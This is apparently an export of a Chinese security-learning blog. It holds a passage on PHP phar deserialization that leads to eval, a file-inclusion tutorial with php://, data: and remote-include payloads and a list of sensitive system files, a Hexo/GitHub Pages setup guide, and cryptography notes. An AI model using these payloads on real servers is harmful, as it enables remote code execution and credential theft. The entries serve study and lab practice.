 &lt;?phphighlight_file(__FILE__);class Testobj&#123;    var $output=&#x27;&#x27;;&#125;@unlink(&#x27;test.phar&#x27;);   //删除之前的test.par文件(如果有)$phar=new Phar(&#x27;test.phar&#x27;);  //创建一个phar对象，文件名必须以phar为后缀$phar-&gt;startBuffering();  //开始写文件$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);  //写入stub$o=new Testobj();$o-&gt;output=&#x27;eval($_GET[&quot;a&quot;]);&#x27;;$phar-&gt;setMetadata($o);//写入meta-data$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件$phar-&gt;stopBuffering();?&gt; &lt;?phphighlight_file(__FILE__);error_reporting(0);class Testobj&#123;    var $output=&quot;echo &#x27;ok&#x27;;&quot;;    function __destruct()    &#123;        eval($this-&gt;output);    &#125;&#125;if(isset($_GET[&#x27;filename&#x27;]))&#123;    $filename=$_GET[&#x27;filename&#x27;];    var_dump(file_exists($filename));&#125;?&gt; 

分析:phar中manifest的值是对Testobj中$output=eval($_GET[&#39;a&#39;])进行序列化后得到的字符串,反序列化必然会调用__destruct(),相当于eval(eval($_GET[&#39;a&#39;])),执行了eval($_GET[&#39;a&#39;]),所以要传入两个参数,$filename处就可以传入phar伪协议参数,??filename=phar://test.phar&amp;a=system(&#39;whoami&#39;);
]]></content>
      <categories>
        <category>Web安全</category>
        <category>PHP反序列化</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>任意文件包含漏洞学习笔记</title>
    <url>/2024/09/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
参考：https://blog.csdn.net/qq_41575340/article/details/91897245
什么是文件包含1.文件包含漏洞概述和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。
什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。
有时候由于网站功能需求，要包含的文件是一个变量，那么前端用户就可以进行选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。
以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()区别如下:
require():找不到被包含的文件会产生致命错误，并停止脚本运行include():找不到被包含的文件只会产生警告，脚本继续执行require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含
例子：在小皮的根目录下放一个test.php里面写上
&lt;?php include $_GET[&#x27;test&#x27;];?&gt;

在根目录下放另外一个file.php
&lt;?php phpinfo();?&gt;

构造url,把file.php作为参数传入
http://192.168.127.231/test.php?test=file.php

文件包含成功

大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：
分类1.本地文件包含漏洞（LFI）仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击者更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。
eg:pikachu靶场的fileinclusion


文件通过一个叫$filename的变量进行包含


但是路径限制在了include下，那么在include文件夹下创建一个test.txt文件、
&lt;?php phpinfo();?&gt;

构造urlhttp://192.168.127.231/pikachu/vul/fileinclude/fi_local.php?filename=test.txt&amp;submit=提交查询
这样test.txt就被包含执行了
包含姿势php伪协议PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。
有些伪协议成功执行需要allow_url_fopen和allow_url_include的支持。
allow_url_fopen On&#x2F;Off 允许或禁止打开URL文件allow_url_include On&#x2F;Off 允许或禁止引用URL文件php:&#x2F;&#x2F;input
php:&#x2F;&#x2F;inputphp:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行
当enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。
利用条件：

allow_url_include &#x3D; On。
对allow_url_fopen不做要求。

php:&#x2F;&#x2F;filterphp:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。
在利用上很多都是与包含函数结合使用，读入或者输出获取文件源码然后编码让其不执行从而输出
php:&#x2F;&#x2F;filter 的使用：如php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.phpphp:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php
其他姿势：
file.php?file=php://filter/convert.base64-encode/resource=index.php

效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。
php:&#x2F;&#x2F;filter 伪协议组成：read&#x3D;&lt;读链的筛选列表&gt;resource&#x3D;&lt;要过滤的数据流&gt;write&#x3D;&lt;写链的筛选列表&gt;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;处理方式（base64编码，rot13等等）&#x2F;resource&#x3D;要读取的文件
read 对应要设置的过滤器：常见的过滤器分字符串过滤器、转换过滤器、压缩过滤器、加密过滤器其中convert.base64-encode ，convert.base64-decode都属于 转换过滤器
phar:&#x2F;&#x2F;
利用条件：
php版本大于等于php5.3.0

假设有个文件phpinfo.php，其内容为，打包成zip压缩包phpinfo.zip
利用：
指定绝对路径：
file.php?file=phar://D:/phpStudy/WWW/phpinfo.zip/phpinfo.php

也可以使用相对路径：
file.php?file=phar://phpinfo.zip/phpinfo.php

zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）
利用条件：

php版本大于等于php5.3.0

姿势：
构造zip包的方法和phar相同。
 但是使用zip伪协议，需要指定绝对路径，同时将#编码为%23,之后填上压缩包内的文件·。
格式示例：
&lt;?php$a=($_GET[&quot;file&quot;]);include($a);?&gt;

压缩及协议访问格式：
压缩文件为.zip后缀zip:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip%23phpinfo.php压缩文件为.bz2后缀compress.bzip2:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php压缩文件为.gz后缀compress.zlib:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php
data：URI schema利用条件：

php版本大于等于php5.2
allow_url_fopen &#x3D; On
allow_url_include &#x3D; On

姿势一：
?file=data:text/plain,&lt;?php phpinfo();?&gt;

也可以执行命令：
?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;

姿势二：
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

PD9waHAgc3lzdGVtKCd3aG9hbWknKTs&#x2F;Pg&#x3D;&#x3D;的base64解码为：
&lt;?php system(&#x27;whoami&#x27;);?&gt;

包含session利用条件：
1.session文件路径已知，且其中内容部分可控。

姿势：
php的session文件的保存路径可以在phpinfo的session.save_path看到。
常见的php-session存放位置：
/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID

其中，session文件的格式是固定的：sess_phpsessid.而phpsessid在发送的请求的cookie字段中可以看到。
敏感文件位置Linux：
/etc/passwd                                                                      //  账户信息/etc/shadow                                                                      //  账户密码文件/usr/local/app/apache2/conf/httpd.conf                                           //   Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf                                //   虚拟网站配置/usr/local/app/php5/lib/php.ini                                                  //   PHP相关配置/etc/httpd/conf/httpd.conf                                                       //   Apache配置文件/etc/my.conf                                                                     //   mysql 配置文件

Win：
c:\boot.ini                                                                      // 查看系统版本c:\windows\system32\inetsrv\MetaBase.xml                                         //  IIS配置文件c:\windows\repair\sam                                                            //  存储Windows系统初次安装的密码c:\Program Files\mysql\my.ini                                                    //   MySQL配置c:\Program Files\mysql\data\mysql\user.MYD                                       //   MySQL rootc:\windows\php.ini                                                               //   php 配置信息c:\windows\my.ini                                                                //   MySQL 配置文件



2.远程文件包含漏洞（RFI） 如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include&#x2F;require函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)
能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。 
eg测试代码：


&lt;?php	$file = @$_GET[&#x27;file&#x27;];	@include($file);?&gt;

在远程服务器上的文件代码(test.txt)


&lt;?phpphpinfo();?&gt;

payload:
http://127.0.0.1/file.php?file=http://192.168.1.103/test.txt
]]></content>
      <categories>
        <category>Web安全</category>
        <category>任意文件包含漏洞</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
        <tag>任意文件包含漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建自己的GitHub-page</title>
    <url>/2025/05/21/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84github-Page/</url>
    <content><![CDATA[搭建自己的github-Page生成SSH Keyssh-keygen -t rsa -C &quot;github绑定邮箱&quot;


验证ssh -T git@github.com


新建自己的仓库








下载git下载链接:https://git-scm.com/downloads/win
参考链接:https://blog.csdn.net/qq_39809160/article/details/145712755

搭建本地博客创建博客目录
安装hexonpm install -g hexo/cli


#创建一个新的hexo项目hexo init myblogs


此时的目录结构


cd myblogsnpm install

此时项目结构

运行hexo项目
hexo server


部署到github获取个人token






打开_config.yml

编辑_config.yml
当前博客目录安装git插件npm install hexo-deployer-git --save

最后hexo clean      # 清理 Hexo 缓存：hexo generate   # 重新生成静态文件#hexo deploy这步之前要先验证身份#git config --global user.email &quot;272510545@qq.com&quot;#git config --global user.name &quot;blkheadfish&quot;hexo deploy     # hexo deploy


博客路径
博客配置项在_config.yml中
修改浏览器tab页标题

#部署到githubhexo g -d


]]></content>
      <tags>
        <tag>杂项</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学学习笔记</title>
    <url>/2025/06/18/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[信息安全目标三要素机密性，完整性，可用性
攻击行为截取(窃听),中断(拒绝服务),篡改,重放,伪造
五大安全属性机密性对应的攻击行为截取&#x2F;窃听
对应的密码技术对称加密&#x2F;公钥加密
完整性对应的攻击行为篡改
对应的密码技术单向散列函数(hash)
可用性对应的攻击行为中断&#x2F;拒绝服务攻击
对应的密码技术&#x2F;
不可否认性对应的攻击行为否认
对应的密码技术数字签名
认证性对应的攻击行为伪造
对应的密码技术消息认证码MAC
密码体制分类密码学分为密码编码学与密码分析学
其中密码编码学根据安全目标分为:
认证体制消息认证认证消息真伪，保证消息源不被假冒
实体认证验证身份，确保对方身份真实性
保密体制对称密码体制加解密使用同一套密钥
优点扩张小(明文密文长度差不多)，易存储(密钥长度较短)，运算快
缺点分发难(对信道安全要求高)，密钥数量大(n个人两两通信,要存储Cn2对密钥),难以解决不可否认性
公钥密码体制优点分发易(公钥pk是公开的),密钥数量小(每个人只需要公开自己的公钥pk，存储自己的私钥sk,n个人只需要管理n个密钥),有认证性(每个人的私钥只有自己知道)
缺点运算慢(大多基于软件实现,对称密码可以依靠硬件实现),扩张大(往往需要在密文中添加其他中间参数以消除随机数影响),不易存储(密钥长度大)

柯克霍夫原则秘密蕴藏于密钥之中，加解密算法安全性取决于密钥安全性，加解密算法过程和细节公开，只要密钥是安全的，攻击者就无法破译明文
安全体制评价无条件安全理论安全性一次一密体制:密钥长度至少和明文长度一致的密码体制；1949年被香农证明无条件安全
缺点:密钥管理困难，现实不适应
优点：计算简单，难以破译
有条件安全计算安全性破译该密码算法在理论上可行，但现有算法与算力不可能完成攻击所需要的计算量
实际安全性时间约束破译所需时间不能超过该密码算法密钥的声明周期(不能花3min去破解一个生命周期只有1min的验证码)
成本约束破译密码系统所需成本不能超过加密信息本身的价值(花1亿去破解只有10块余额的银行卡)
密码体制模型密码体制&#x2F;系统组成:{明文，密文，加密密钥，解密密钥，加密算法，解密算法}

m:明文	M:明文空间
c:密文    C:密文空间
k1:加密密钥	K1:加密密钥空间
k2:解密密钥	K2:解密密钥空间
c &#x3D; Ek1(m)
m &#x3D; Dk2(c)

	
密码体制安全性破译密码体制不知密钥，从密文推出明文&#x2F;密钥
攻击方法唯密文攻击分析者手上只有一些截获的密文，根据这些密文推出明文&#x2F;密钥
已知明文攻击分析者手上不仅有相当数量的密文，同时还有一些明文密文对
选择明文攻击[加密机被暂时控制]分析者手上不仅有相当数量的明文密文对，还能选择任意明文通过未知密钥获得对应密文
选择密文攻击[解密机被暂时控制]分析者手上不仅有相当数量的明文密文对，还能选择任意密文通过未知密钥解密出对应明文
选择文本攻击[加密机和解密机都被暂时控制]选择明文攻击和选择密文攻击的结合
攻击强度唯密文攻击&lt;已知明文攻击&lt;选择明文攻击&lt;选择密文攻击&lt;选择文本攻击
能抵抗强度更高的攻击，自然可以抵抗强度低于它的攻击
现代密码要求至少能抵御唯密文攻击和已知明文攻击
单表代换密码明文中相同的字母在密文中都使用1个固定字母替换
基于密钥给定一个字符串(eg:arrive)，将其中重复的字符去除，得到一个字母序列作为密钥(arive),明文密文映射规则如下:
a b c d e … z
a r i v e … z
将密钥字符串放到最前面，其他字母依次排序
仿射密码明文x，密文y
加密:​	y&#x3D;ax+b (mod 26)
其中gcd(a,26) &#x3D; 1 b是模26生成群中的一个元素
解密:​	ax &#x3D; y-b (mod 26)
​	  x &#x3D; a^-1(y-b) (mod 26)
当a&#x3D;1，b&#x3D;3时，就是凯撒密码
仿射密码的密钥空间：b属于Z26,b有26种情况,gcd(a,26)&#x3D;1,a有φ(26) &#x3D; 1*12 &#x3D; 12种
K &#x3D; 26*12 &#x3D; 312
多表代换密码明文中的字母根据其出现的位置不同，在密文中被替换为不同字母
Hill密码思想:明文密文转换构建在从字母到Z26群的映射
步骤1.明文序列化
将明文字母映射到Z26上(A-&gt;0,B-&gt;1,…,Z-&gt;25),构建n行1列或1行n列的明文矩阵M (根据题目要求)
2.n*n密钥矩阵K
验证是否可逆 |K| !&#x3D; 0
3.加密
C&#x3D;K*M mod26 (n行1列)
or
C&#x3D;M*K mod26 (1行n列)
4.密文反序列化
C中的Z26群元素映射回字母
(0-&gt;A,1-&gt;B,…,25-&gt;Z)
Enigma密码机构件通过三个转子(26^3),接线板(10组线,10^16)提供了密钥空间
反射器使加解密算法相同
安全性不能穷举攻击密钥空间有26^3*10^16这么大
不能用字母频度分析每次输入都会使转子转动，相同的字母会被加密成多种不同结果
传统密码分析统计分析一些字母&#x2F;字母对出现的频率高于其他字母&#x2F;字母对
明文密文对分析对于Hill密码，若已知超过矩阵维数的明文密文对，就很容易破译
C&#x3D;MK -&gt; K&#x3D;M^-1C
分组密码将明文消息编码后得到的二进制序列划分成等长的块，在密钥控制下，每个块被加密成等长密文
设计原则扩散输入的明文每1比特的变化都尽可能多的影响输出明文的比特
混乱加密过程中，明文、密文、密钥之间的关系尽可能变得复杂(像把他们扔到搅拌机搅碎了那样)
乘积密码将简单的密码操作（轮函数）多次迭代，形成更强的混淆和扩散效果
迭代结构Feistel网络结构特点：输入会被分为等长的左右两部分
加密(Li表示左半部分,Ri表示右半部分,F()表示轮函数) i&#x3D;0,1,2,…,n
​	Li &#x3D; Ri-1
​	Ri &#x3D; Li-1 xor F(Ri-1,Ki)
解密 i&#x3D;n,n-1,…,1,0
​	Ri-1 &#x3D; Li
​	Li-1 &#x3D; Ri xor F(Li,Ki)
SP网络结构S:代换	P:置换
通过多轮S代换和P置换交替迭代形成SP网络
S盒起混乱作用；S盒是许多密码算法唯一的非线性部件，决定了密码算法的安全强度
P盒起扩散作用(单置换不会起扩散作用，但是与多轮迭代和代换相结合，置换也起到了扩散作用)
雪崩效应输入明文的微小变化也会导致输出密文产生显著变化
工作模式ECB特点:明文块独立加密(可并行加密)，相同明文块加密结果相同

只能用于加密小数据(只有一个分组或不足一个分组)，否则暴露统计特性，很危险
CBC引入了初始向量IV，用于抗重放攻击
初始化向量IV xor 明文分组1的结果加密得到密文分组1
密文分组1 xor 明文分组2的结果加密得到密文分组2
…
CFB与CBC不同的是，CFB是先加密在进行异或
初始化向量IV加密后，与明文分组1异或得到密文分组1
密文分组1加密后，与明文分组2异或得到密文分组2
…
OFB对初始化向量IV做流加密(串行，但可预处理)
向量IV第i次加密的结果与明文分组i异或得到密文分组i
CTR与OFB区别，OFB对初始化向量做流加密(串行),但是CTR使用计数器进行加密，是并行的
计数器并行生成加密的结果，与明文分组进行异或，得到密文分组
注意1.ECB不能用来加密结构化数据(图片等)，因为ECB模式中，相同明文块的加密结果相同，这样一来会暴露明文模式
2.CBC模式的IV必须是随机且不可预测的，否则可能遭受选择明文攻击
3.CFB，OFB，CTR的IV或计数器不能重复使用
对称密码-DES基本结构分组密码算法，对称加密体制，加解密使用同一个密钥
分组长度:64位，不足64位的分组采取填充策略
密钥长度:64位，其中有效位数56位，第8k位(k&#x3D;1,2,…,8)为奇偶校验位
迭代结果：Feistel网络结构(加解密结构相同，同一套软硬件实现)
加密Feistel结构
初始64位明文分组m，经置换表IP后，分为等长32位的左右两部分,进行迭代，总共迭代16轮，最后一轮不再交换左右
先经过置换IP
1-15轮
Li &#x3D; Ri-1
Ri &#x3D; Li-1 xor F(Ri-1,Ki)
16轮
Ri &#x3D; Ri-1
Li &#x3D; Li-1 xor F(Ri-1,Ki)
密钥编排初始密钥64位，经置换选择1后变为56位，循环左移输出56位，经置换选择2后变为48位，参与到加密的轮函数中
轮函数F步骤可概括为E+SP
E拓展，将长度为32位的半个明文块扩展到48位，便于与输入的48位密钥按位异或
+将拓展后的半个明文块与密钥按位异或
S进行S盒非线性字节代换（查表操作）；按位异或的结果为48位，分成8个组，对应8个S盒，每个分组长度为6位,表示为b1b2b3b4b5b6
查表规则如下:
行坐标:b1b6
列坐标:b2b3b4b5
将6位输入通过查表转换为4位输出
总体上就是，48位重新变为32位
PP盒线性置换
安全性由于单DES算法已不再安全，受限于兼容性等现实问题，发展出了多重DES用于解决DES的安全性问题
2DES顾名思义，进行两次DES加密操作的DES
存在问题:中间相遇攻击

有效密钥长度为56位
从m-&gt;c1,计算复杂度为2^56,c2-&gt;c1计算复杂度为2^56
从这两个计算中找到 Dk1(m) &#x3D;&#x3D; Ek2(c2),计算复杂度为2^56
总的复杂度约是2^57,相较与单DES，并没有显著提升安全性，因此2DES被淘汰
3DESEEE3模式使用3个不同密钥，加密三次Ek1()-&gt;Ek2()-&gt;Ek3()
密钥长度168位
EDE3模式使用3个不同密钥,Ek1()-&gt;Dk2()-&gt;Ek3()
密钥长度168位
EEE2模式使用2个不同密钥,Ek1()-&gt;Ek2()-&gt;Ek1()
密钥长度112位
EDE2模式使用2个不同密钥,Ek1()-&gt;Dk2()-&gt;Ek1()
密钥长度112位
以EEE3为例，暴力破解的复杂度为2^168,如果采用中间相遇攻击，m-&gt;c1复杂度为2^56,c1-&gt;c2复杂度为2^56,那么m-&gt;c2复杂度为2^112,c3-&gt;c2复杂度为2^56,总的复杂度仍为2^168,不能被中间相遇攻击降低复杂度
优点:
1.密钥长度从单DES的56位增加到112位或168位，有效抗穷举攻击
2.升级成本低
缺点:
1.运算时间长，处理速度慢
2.密钥长度增加与明文长度不相匹配
对称密码-AES基于SP网络结构(加解密结构不同，不能用同一套软硬件实现)，密钥长度128&#x2F;192&#x2F;256，对应迭代轮数10&#x2F;12&#x2F;14；分组长度128位
以AES-128为例
加密每轮结构为:字节代换-&gt;行移位-&gt;列混合-&gt;轮密钥加
第1轮:轮密钥加-&gt;字节代换-&gt;行移位-&gt;列混合-&gt;轮密钥加
第10轮:字节代换-&gt;行移位-&gt;轮密钥加
字节代换加密:S盒代换（16*16矩阵），1旧字节-&gt;1新字节，代换规则：
行坐标:1字节的高4位	列坐标:1字节的低4位
解密:逆S盒(16*16矩阵)
1旧字节-&gt;1新字节，代换规则：
行坐标:1字节的高4位	列坐标:1字节的低4位
行移位128位明文块为16字节，转换为4*4矩阵
第一行循环左移0位，第二行循环左移1位，…,第四行循环左移3位
密钥拓展128位密钥为16字节，转换为4*4矩阵
每列为一个字w[i]
拓展40个新列
w[i] &#x3D; w[i-4] xor w[i-1] i&#x3D;4k
w[i] &#x3D; w[i-4] xor T(w[i-1]) i !&#x3D; 4k
T是一个复杂的函数
1.字循环:一个字中的4字节循环左移1位
2.S盒字节代换，规则与加密的相同
3.与轮常量Rcon[j]异或,j为轮数
解密每轮结构：逆字节代换-&gt;逆行移位-&gt;逆列混合-&gt;轮密钥加
第1轮:轮密钥加-&gt;逆字节代换-&gt;逆行移位-&gt;逆列混合-&gt;轮密钥加
第10轮:逆字节代换-&gt;逆行移位-&gt;轮密钥加
逆字节代换解密:逆S盒(16*16矩阵)
1旧字节-&gt;1新字节，代换规则：
行坐标:1字节的高4位	列坐标:1字节的低4位
逆行移位128位明文块为16字节，转换为4*4矩阵
第一行循环右移0位，第二行循环右移1位，…,第四行循环右移3位
Hash函数性质单向性对于给定的消息m，计算H(m)容易，（抗原像性）但是对于给定的H(m),推出原消息m在计算上不可行
抗碰撞性碰撞:对于x!&#x3D;y,有H(x)&#x3D;H(y)
抗弱碰撞性对于任意给定的消息x，找到y!&#x3D;x且h(y)&#x3D;h(x)在计算上不可行（更难找到）
抗强碰撞性对于任意2个消息x!&#x3D;y,找到h(x)&#x3D;h(y)对应的(x,y)在计算上不可行
压缩性对于任意长度的输入消息m，输出的消息摘要长度固定
应用数字签名通常h(m)的长度 &lt;&lt; m的长度，对h(m)计算签名比对m计算签名更加高效
文件&#x2F;程序指纹对文件&#x2F;程序生成哈希值，如果文件&#x2F;程序被篡改，哈希值就会发生变化
安全存储&#x2F;传输口令涉及数据库存储的系统存储用户口令，通常不会存储明文，而是进行哈希压缩后存储，并且定期对其再进行哈希压缩
区块链交易的哈希值存到叶子节点HMAC基于Hash的消息认证码
密钥处理与分组长度b相比：

密钥短:末尾补0
密钥长:通过当前HMAC实例选择的Hash算法压缩成长度为n的消息摘要

算法步骤异或处理密钥处理后得到k2
ipadkey &#x3D; k2 xor ipad (ipad是0x00000036重复b&#x2F;8次)
组合m || ipadkey
哈希处理h1 &#x3D; hash(m || ipadkey)
异或处理opadkey &#x3D; k2 xor opad (opad是0x0000005C重复b&#x2F;8次)
组合h1 || opadkey
哈希处理h2 &#x3D; hash(h1 || opadkey)
输出MAC输出h2
安全性遭遇重放攻击：
​	1.为消息赋予一个序号，双方同步更新
​	2.时间戳:时钟一致（由于通信延迟存在并不能完全抵御）
​	3.引入随机数，通信前先发送随机数（随机数生成计算开销；通信轮数增加）
暴力破解:
​	1.限制单位时间内请求MAC验证的次数
​	2.使用足够长的密钥
公钥密码-RSA基于大整数分解困难问题
密钥生成生成随机大素数p，q
计算n&#x3D;pq
计算φ(n) &#x3D; (p-1)(q-1)
引入随机数e作为公钥,gcd(e,φ(n))&#x3D;1
计算私钥d，de &#x3D; 1 modφ(n)
公钥(n,e),私钥d
加密原消息m
c &#x3D; m^e mod n
解密m &#x3D; c^d mod n
安全性中间人攻击:对接收者伪装成发送者，对发送者伪装成接收者

效果:虽然没有直接破译RSA算法，但是破坏了消息的机密性且不易被察觉
中间人攻击成功的根本原因是:
1.缺乏身份认证，导致消息来源不详，攻击者可以伪装成任意身份
2.信道不安全，攻击者可以直接在信道中读写传输内容
公钥密码-ElGamal基于离散对数困难问题
密钥生成选择大素数p，在模p剩余类群Zp中找一个生成元g
选择一个随机数x作为私钥，计算公钥y &#x3D; g^x mod p
加密选取随机数a作为保密参数，计算A &#x3D; g^a mod p
计算中间参数k &#x3D; y^a mod p
对消息m进行加密，c &#x3D; k*m mod p
密文为(A,c)
解密m &#x3D; c&#x2F;A^x mod p
安全性1.延展性攻击
截获密文A||C，对C扩大b倍
解密时 bC&#x2F;A^x modp &#x3D; bM
明文也被放大了b倍
2.主动&#x2F;积极攻击
观察密文重复性，判断保密参数a是否重复
公钥密码-ECC基于椭圆曲线上的离散对数困难问题
密钥生成椭圆曲线群Ep(a,b)上选取一条椭圆曲线,找到生成元点G，阶为n(使nG &#x3D; O的最小的n是一个素数)
选取随机数nb作为私钥(0&lt;nb&lt;n),计算公钥P&#x3D;nbG
计算P不需要穷举，事实上，在椭圆曲线上计算kG，依据平衡二叉树进行计算，复杂度为logn
形如:
知道nb,2^m-1 &lt;&#x3D; nb &lt;&#x3D; 2^m，只需要计算m次
加密选取随机数k
计算P1 &#x3D; kG，P2&#x3D;kP
选取随机点Pt&#x3D;(xt,yt)
计算C &#x3D; Mxt+yt
密文为 P1||P2+Pt||C
解密Pt &#x3D; P2+Pt-nbP1&#x3D;(xt,yt)
M &#x3D; C-yt &#x2F; xt
安全性ECC是公钥密码体制中安全强度最高的体制之一
ECC为什么没有完全替代RSA？
1.历史遗留问题，RSA已使用近50年，一些老旧系统只能支持RSA而不能原生支持ECC
2.ECC原理复杂，实现复杂度高
为什么公钥都是基于私钥生成的?
公钥密码体制的安全性依赖于公私钥计算的单向函数，从私钥推出公钥容易，但是从公钥推出私钥在计算上是不可行的；
公钥是公开的，如果私钥基于公钥生成，那么私钥就没有安全性可言了
基于私钥生成公钥，还能确保二者严格对应
公钥密码本质:利用数学上的单向函数，构造成一种由私钥推出公钥容易，而由公钥推出私钥在计算上不可行的密码体制
数字签名实现方法:对消息的散列值进行签名(签名的消息不具有机密性)
对比直接对原消息签名，优势在于:
1.消息散列值的长度一般远小于消息本身长度，签名效率更高，开销更小
2.能抵御大部分伪造攻击；以RSA签名方案为例，如果直接对原消息签名，s1&#x3D;m1^d mod p,s2 &#x3D; m2^d mod p;攻击者构造新签名s3&#x3D;s1*s2&#x3D;(m1m2)^d mod p &#x3D; m3^d mod p,在数学上是合理的
RSA数字签名密钥生成大素数p,q
计算n &#x3D; p*q,φ(n)&#x3D;(p-1)(q-1)
随机数e作为公钥，满足gcd(e,φ(n))&#x3D;1
私钥d:de&#x3D;1 modφ(n)
生成签名选择安全hash函数h()
s &#x3D; (h(m))^d mod p
与RSA加密不同(相反)的是，签名时使用私钥，验证时使用公钥
验证签名验证s^e mod p是否与h(m)相等
Schnorr-ECC数字签名密钥生成选取椭圆曲线群Ep(a,b),选取椭圆曲线E，选取一个生成元点G，选取随机数nb作为私钥，生成公钥Pb &#x3D; nbG &#x3D; (xp,yp)
生成签名选取随机数k，计算R&#x3D;kG&#x3D;(xr,pr)
生成签名s&#x3D;k+h(Pb||R||m)*nb
验证签名验证 sG与 R+h(Pb||R||m)*Pb
DSA密钥生成大素数p，q，满足p-1被q整除
选取随机数h，计算g&#x3D;h^(p-1)&#x2F;q modp
选取随机数x作为私钥，计算公钥y&#x3D;g^x modp
生成签名选择随机数k
计算r&#x3D;g^k modp modq
计算s&#x3D;(h(m)+xr)*k^-1 modp
验证签名计算w&#x3D;s^-1 mod p
计算u1 &#x3D; h(m)*w mod p
计算u2 &#x3D; r*w mod p
计算 v&#x3D;g^u1 * y^u2 mod p 是否与r相等
特殊数字签名盲签名
签名者对内容不可见
环签名
完全匿名
群签名
群成员可以代表群组签名，管理员可以溯源
门限签名
签名分为n个份额，超过t个参与者才能生成签名
不可否认签名
需要签名者配合认证，防止未授权认证
聚合签名
多个签名压缩为单个签名
密钥管理生命周期
为什么要将密钥销毁?
为了前向安全
前向安全：确保长期使用的密钥即使泄露，过去加密的信息也不会被破译
密钥建立对于对称密码使用密钥分配中心KDC
核心思想使用一个安全第三方(KDC)将双方通信所需的会话密钥分别用双方各自持有的密码加密后，再进行分发
步骤
A与B想进行安全通信(即使被窃听也不会泄露会话内容)
于是，可信第三方C生成了二人的会话密钥kab；C将kab复制两份，一份用只有A知道的密码k1加密，另一份用只有B知道的密码k2加密
C将两份加密后的会话密钥统一发给A
A用自己的密码k1解密使用k1加密的kab，将自己想传输的信息m用kab加密后，连带着使用k2加密的kab一起发送给B
B收到使用k2加密的kab，使用自己的密码k2进行解密，得到kab；再对A使用kab加密后的消息m解密，得到原消息m

对于公钥密码DH密钥交换协议 (密钥协商)
握手阶段
选择大素数p，模p剩余类群Zp上选择生成元g
公开p，g

协商阶段
对于Alice，选取随机数a作为保密参数，生成A&#x3D;g^a mod p
对于Bob，选取随机数b作为保密参数，生成B&#x3D;g^b mod p
Alice将A发送给Bob，Bob计算会话密钥kba &#x3D; A^b mod p
Bob将B发送给Alice，Alice计算会话密钥kab &#x3D; A^a mod p

最终得到会话密钥k&#x3D;kab&#x3D;kba&#x3D;g^ab mod p
安全性由于传输过程中缺乏对身份的认证，而且DH密钥交换协议是建立在双方在不安全信道上进行通信的情境下
会遭受中间人攻击

秘密共享技术基本要求
